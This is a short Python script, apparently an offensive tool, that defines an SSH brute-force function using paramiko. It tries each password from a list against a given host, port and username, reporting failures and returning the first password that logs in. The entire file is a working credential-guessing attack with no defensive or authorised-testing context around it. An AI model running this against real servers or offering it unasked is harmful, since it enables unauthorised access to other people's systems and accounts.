import paramiko

def ssh_brute_force(host, port, username, password_list):
    print(f"[+] Starting brute-force on {host}:{port} with user '{username}'...")
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    for password in password_list:
        try:
            client.connect(hostname=host, port=port, username=username, password=password, timeout=3)
            print(f"[!] Success: Username='{username}', Password='{password}'")
            return password
        except:
            print(f"[-] Failed with password: {password}")
    print("[x] Brute-force complete. Password not found.")
    return None
